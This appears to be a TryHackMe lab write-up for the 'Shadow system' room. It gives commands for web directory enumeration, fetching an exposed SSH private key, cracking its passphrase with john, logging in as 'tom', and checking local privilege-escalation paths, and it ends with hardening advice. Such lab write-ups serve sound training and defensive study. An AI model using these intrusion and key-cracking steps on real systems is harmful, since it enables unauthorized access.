# Shadow System — TryHackMe Write-Up

| Field | Details |
| :--- | :--- |
| **Challenge** | Shadow system |
| **Platform** | TryHackMe |
| **Category** | Boot-to-Root / Web & Local Privilege Escalation |
| **Difficulty** | Easy / Medium |
| **Target User** | `tom` -> `root` |
| **Objectives** | Enumerate web paths, locate exposed SSH key (`id_rsa`), audit key passphrase, access host as `tom`, escalate to `root`, and read `user.txt` & `root.txt` |

---

## Executive Summary

`Shadow system` revolves around structured web enumeration, sensitive key exposure, offline passphrase auditing, authenticated remote access (`tom`), and local privilege escalation (`root`). The challenge tests disciplined reconnaissance and verification rather than complex exploitation chains.

### Attack Chain Overview

[Web Enumeration]
       │
       ▼
[Exposed id_rsa Key]
       │
       ▼
[Passphrase Auditing]
       │
       ▼
[SSH Access: tom] ──▶ [user.txt]
       │
       ▼
[Privilege Escalation]
       │
       ▼
[Root Access: root] ──▶ [root.txt]

---

## Phase 1: Reconnaissance & Web Enumeration

### 1.1 Host Reachability & HTTP Headers

Verify network connectivity and inspect basic HTTP response headers before running directory discovery.

ping -c 4 <TARGET_IP>
curl -I http://<TARGET_IP>/

### 1.2 Directory & Resource Discovery

Enumerate hidden paths, directories, and exposed files on the target web service.

dirb http://<TARGET_IP>/

Alternative enumeration with a wordlist for cross-checking endpoints:

gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40

### 1.3 Retrieving & Securing the Private Key

Once the exposed `id_rsa` key is found, download it locally and set restrictive file permissions (`600`) so the SSH client accepts it.

wget http://<TARGET_IP>/<PATH_TO_ID_RSA> -O id_rsa
chmod 600 id_rsa
file id_rsa
head -n 5 id_rsa

---

## Phase 2: Offline Key Auditing & Initial Access

### 2.1 Extracting Hash & Cracking Passphrase

Convert the passphrase-protected private key into a hash format and test it against a wordlist.

ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash

### 2.2 SSH Login as `tom` & User Flag

Authenticate to the target over SSH using the private key and recovered passphrase, then inspect the user environment and read `user.txt`.

ssh -i id_rsa tom@<TARGET_IP>
id
whoami
hostname
uname -a
pwd
ls -la
cat user.txt

---

## Phase 3: Local Enumeration & Privilege Escalation

### 3.1 System & Permission Checks

Inspect `sudo` privileges, SUID/SGID binaries, writable paths, scheduled tasks, and running processes to identify local privilege escalation paths.

sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
ps aux

### 3.2 Escalating to `root` & Root Flag

After elevating privileges to `root`, confirm root context, inspect `/root`, and read the final flag.

id
ls -la /root
cat /root/root.txt

---

## Summary & Hardening Notes

| Risk Area | Impact | Mitigation |
| :--- | :--- | :--- |
| **Exposed `id_rsa` in Web Root** | Unauthorized remote access entry point | Never store private keys, backups, or secrets inside web-accessible directories |
| **Weak / Crackable Key Passphrase** | Offline credential recovery if key leaks | Use strong passphrases and enforce strict key management and file permissions (`600`) |
| **Unrestricted Local Privilege Paths** | Full host compromise (`root`) from `tom` | Audit `sudo -l`, SUID binaries, cron jobs, and file permissions regularly |
